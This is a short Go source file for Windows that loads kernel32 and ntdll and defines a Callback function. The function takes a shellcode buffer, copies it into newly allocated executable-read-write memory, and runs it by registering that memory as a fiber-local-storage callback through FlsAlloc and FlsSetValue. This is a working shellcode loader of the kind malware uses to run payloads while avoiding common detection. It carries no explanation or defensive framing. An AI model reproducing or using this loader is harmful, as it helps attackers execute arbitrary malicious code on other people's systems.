package TT

import (
	"syscall"
	"unsafe"
)

var (
	if1 [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	GetCurrentProcess = kernel32.MustFindProc("GetCurrentProcess")
	FlsAlloc          = kernel32.MustFindProc("FlsAlloc")
	FlsSetValue       = kernel32.MustFindProc("FlsSetValue")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	dIndex, _, _ := FlsAlloc.Call(addr)
	dummy, _ := syscall.UTF16PtrFromString("dummy")
	FlsSetValue.Call(dIndex, (uintptr)(unsafe.Pointer(dummy)))
}
